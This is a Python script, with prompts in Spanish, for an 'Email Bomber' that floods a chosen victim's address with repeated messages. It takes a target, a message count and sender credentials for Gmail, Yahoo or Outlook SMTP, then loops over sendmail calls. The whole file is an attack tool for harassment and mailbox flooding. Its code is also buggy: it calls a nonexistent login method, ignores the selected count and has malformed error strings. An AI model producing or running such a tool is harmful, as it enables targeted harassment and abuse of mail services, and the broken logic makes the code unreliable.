import smtplib
import sys
import time

class colores:
    VERDE = '\033[92m'
    AMARILLO = '\033[93m'
    ROJO = '\033[91m'

def banner():
    print(colores.VERDE + '+[+[+[ Email Bomber ]+]+]+')
    print(colores.VERDE + '+[+[+[ made with codes ]+]+]+')
    print(colores.VERDE + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')

class Email_Bomber:
    cuenta = 0

    def __init__(self):
        try:
            print(colores.ROJO + '\n+[+[+[ Inicializando programa ]+]+]+')
            self.victima = str(input(colores.VERDE + 'Ingresa el email victima <: '))
            self.modo = int(input(colores.VERDE + 'Ingresa el tipo de BOMBA (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(Personalizado) <: '))
            if int(self.modo) > int(4) or int(self.modo) < int(1):
                print('Error: Opcion invalida.')
                sys.exit(1)
        except Exception as e:
            print('Error: {e}')

    def bomba(self):
        try:
            print(colores.ROJO + '\n+[+[+[ Armando Bomba ]+]+]+')
            self.cantidad = None

            if self.modo == int(1):
                self.cantidad = int(1000)
            elif self.modo == int(2):
                self.cantidad = int(500)
            elif self.modo == int(3):
                self.cantidad = int(250)
            else:
                self.cantidad = int(input(colores.VERDE + 'Elige una cantidad personalizada <: '))
            
            print(colores.ROJO + f'\n+[+[+[ Has seleccionado el modo: {self.modo} de {self.cantidad} emails ]+]+]+')
            
        except Exception as e:
            print(f'Error: {e}')
        
    def email(self):
        
        try:
            print(colores.ROJO + '\n+[+[+[ Configurando Email ]+]+]+')
            self.servidor = str(input(colores.VERDE + 'Ingrese el servidor de email | o seleccione opciones preestablecidas - 1:Gmail 2:Yahoo 3:Outlook <: '))
            preestablecidos = ['1', '2', '3']
            puerto_default = True
            if self.servidor not in preestablecidos:
                puerto_default = False
                self.puerto = int(input(colores.VERDE + 'Ingrese el numero de puerto <: '))
            
            if puerto_default == True:
                self.puerto = int(587)

            if self.servidor == '1':
                self.servidor = 'smtp.gmail.com'
            elif self.servidor == '2':
                self.servidor = 'smtp.mail.yahoo.com'
            elif self.servidor == '3':
                self.servidor = 'smtp.mail.outlook.com' 
            
            self.direccion_fuente = str(input(colores.VERDE + 'Ingresa la direccion email fuente <: '))
            self.contraseña = str(input(colores.VERDE + 'Ingresa la contraseña del email fuente <: '))
            self.asunto = str(input(colores.VERDE + 'Ingresa el asunto <: '))
            self.mensaje = str(input(colores.VERDE + 'Ingresa el mensaje <: '))

            self.msj = '''De: %s\nTo: %s\nAsunto: %s\n%s\n'''%(self.direccion_fuente, self.victima, self.asunto, self.mensaje)

            # Servidor
            self.s = smtplib.SMTP(self.servidor, self.puerto)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.login(self.direccion_fuente, self.contraseña)
        
        except Exception as e:
            print(f'Error: {e}')
    
    def enviar(self):
        try:
            self.s.sendmail(self.direccion_fuente, self.victima, self.msj)
            self.cuenta += 1
            print(colores.AMARILLO + f'Bomba: {self.cuenta}')
        
        except Exception as e:
            print('Error: {e}')


    def atacar(self):
        for email in range(20):
            print(colores.VERDE + '\n+[+[+[ Intentando asegurar el login a la cuenta... ]+]+]+')
            self.s.login(self.direccion_fuente, self.contraseña)
            print(colores.ROJO + '\n+[+[+[ Atacando de 50 en 50... ]+]+]+')
        for email in range(50):
                self.enviar()
                time.sleep(0.5)
        time.sleep(60)

        self.s.close()
        print(colores.ROJO + '\n+[+[+[ Ataque terminado ]+]+]+')    
        
if __name__ == '__main__':
    banner()
    bomba = Email_Bomber()
    bomba.bomba()
    bomba.email()
    bomba.atacar()
